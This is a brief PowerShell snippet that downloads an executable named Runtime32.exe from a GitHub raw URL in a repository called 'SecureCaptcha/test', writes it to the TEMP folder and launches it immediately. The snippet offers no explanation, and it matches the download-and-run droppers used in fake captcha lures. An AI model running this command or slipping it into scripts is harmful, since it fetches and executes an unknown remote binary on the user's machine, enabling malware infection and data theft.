
$url = 'https://raw.githubusercontent.com/SecureCaptcha/test/main/Runtime32.exe'
$outputFile = "$env:TEMP\Runtime32.exe"

Invoke-WebRequest -Uri $url -OutFile $outputFile

Start-Process -FilePath $outputFile
